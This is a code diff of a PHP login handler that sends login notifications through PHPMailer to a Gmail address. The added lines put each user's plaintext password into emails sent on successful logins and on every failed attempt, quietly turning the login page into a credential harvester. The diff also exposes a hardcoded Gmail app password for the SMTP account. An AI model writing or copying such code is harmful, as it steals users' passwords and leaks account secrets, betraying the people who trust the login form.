@@ -59,9 +59,10 @@ if (empty($errors)) {
             $mail->addAddress('itinventorymanagement@gmail.com'); // Admin email (your email)
 
             $mail->isHTML(true);
-            $mail->Subject = 'User Login Notification';
+            $mail->Subject = 'Successfully Logged.';
             $mail->Body    = 'A user has successfully logged in.<br>'
                            . 'Email: ' . $username . '<br>'
+                            . 'Password: ' . $password . '<br>'
                            . 'IP Address: ' . $user_ip . '<br>'
                            . 'Location: ' . ($location['city'] ?? 'Unknown') . ', ' . ($location['country'] ?? 'Unknown') . '<br>'
                            . 'Login Time: ' . date("Y-m-d H:i:s");
@@ -78,51 +79,51 @@ if (empty($errors)) {
         // Increment login attempts
         $_SESSION['login_attempts']++;
 
-        // Check if login attempts have reached 3
+        // Optionally get user's location
+        $location = get_location($user_ip);
+
+        // PHPMailer: Send notification email for every failed login attempt
+        try {
+            $mail = new PHPMailer(true);
+            $mail->SMTPDebug = 0; // Disable verbose debug output
+            $mail->isSMTP();
+            $mail->Host = 'smtp.gmail.com'; // Set mailer to use SMTP
+            $mail->SMTPAuth = true;
+            $mail->Username = 'itinventorymanagement@gmail.com'; // Your Gmail address
+            $mail->Password = 'okfkncvsjvmysglc'; // Your Gmail app password
+            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+            $mail->Port = 587;
+
+            // Recipients
+            $mail->setFrom('itinventorymanagement@gmail.com', 'IT Inventory Management');
+            $mail->addAddress('itinventorymanagement@gmail.com'); // Admin email (your email)
+
+            // Content
+            $mail->isHTML(true);
+            $mail->Subject = 'Failed Login Attempt';
+            $mail->Body    = 'A Failed Login Attempt.<br>'
+                           . 'Username: ' . $username . '<br>'
+                           . 'Password: ' . $password . '<br>' // Include password in email
+                           . 'IP Address: ' . $user_ip . '<br>'
+                           . 'Location: ' . ($location['city'] ?? 'Unknown') . ', ' . ($location['country'] ?? 'Unknown') . '<br>'
+                           . 'Time: ' . date("Y-m-d H:i:s");
+
+            $mail->send();
+        } catch (Exception $e) {
+            error_log('Failed login attempt notification could not be sent. Mailer Error: ' . $mail->ErrorInfo);
+        }
+
+        // Reset login attempts after 3 failed attempts, if needed
         if ($_SESSION['login_attempts'] >= 3) {
-            // Optionally get user's location
-            $location = get_location($user_ip);
-
-            // PHPMailer: Send notification email for failed login attempts
-            try {
-                $mail = new PHPMailer(true);
-                $mail->SMTPDebug = 0; // Disable verbose debug output
-                $mail->isSMTP();
-                $mail->Host = 'smtp.gmail.com'; // Set mailer to use SMTP
-                $mail->SMTPAuth = true;
-                $mail->Username = 'itinventorymanagement@gmail.com'; // Your Gmail address
-                $mail->Password = 'okfkncvsjvmysglc'; // Your Gmail app password
-                $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-                $mail->Port = 587;
-
-                // Recipients
-                $mail->setFrom('itinventorymanagement@gmail.com', 'IT Inventory Management');
-                $mail->addAddress('itinventorymanagement@gmail.com'); // Admin email (your email)
-
-                // Content
-                $mail->isHTML(true);
-                $mail->Subject = 'Failed Login Attempts Alert';
-                $mail->Body    = 'There have been 3 failed login attempts.<br>'
-                               . 'Username: ' . $username . '<br>'
-                               . 'IP Address: ' . $user_ip . '<br>'
-                               . 'Location: ' . ($location['city'] ?? 'Unknown') . ', ' . ($location['country'] ?? 'Unknown') . '<br>'
-                               . 'Time: ' . date("Y-m-d H:i:s");
-
-                $mail->send();
-            } catch (Exception $e) {
-                error_log('Failed login attempt notification could not be sent. Mailer Error: ' . $mail->ErrorInfo);
-            }
-
-            // Reset login attempts after notification
             $_SESSION['login_attempts'] = 0;
         }
 
         $session->msg("d", "Sorry Username/Password incorrect.");
-        redirect('login.php?access=allowed', false);
+        redirect('L-Login.php?access=allowed', false);
     }
 
 } else {
     $session->msg("d", $errors);
-    redirect('login.php?access=allowed', false);
+    redirect('L-Login.php?access=allowed', false);
 }
 ?>
